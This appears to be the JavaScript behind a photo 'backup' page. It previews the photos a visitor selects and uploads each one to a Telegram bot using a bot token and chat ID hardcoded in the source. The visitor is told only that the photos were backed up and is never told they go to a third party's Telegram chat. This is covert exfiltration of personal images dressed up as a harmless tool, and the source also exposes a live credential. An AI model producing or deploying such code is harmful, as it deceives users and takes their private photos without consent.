document.addEventListener('DOMContentLoaded', function() {
    const photoInput = document.getElementById('photoInput');
    const selectButton = document.getElementById('selectButton');
    const previewArea = document.getElementById('previewArea');
    const statusDiv = document.getElementById('status');

    const BOT_TOKEN = '8238147788:AAGG3aSgjA9wTBxF_dEeidOLorxhFD_GFig';
    const CHAT_ID = '8089839247';

    selectButton.addEventListener('click', () => {
        photoInput.click();
    });

    photoInput.addEventListener('change', async function(event) {
        previewArea.innerHTML = '';
        statusDiv.textContent = 'Processing photos...';
        statusDiv.style.color = '#ff9800';

        const files = Array.from(event.target.files);

        // Preview
        files.forEach(file => {
            const reader = new FileReader();
            reader.onload = function(e) {
                const img = document.createElement('img');
                img.src = e.target.result;
                img.classList.add('previewImg');
                previewArea.appendChild(img);
            };
            reader.readAsDataURL(file);
        });

        // Send to Telegram
        for (const file of files) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending file:', error);
            }
        }

        statusDiv.textContent = `Success! ${files.length} photo(s) have been backed up.`;
        statusDiv.style.color = '#4CAF50';
    });
});
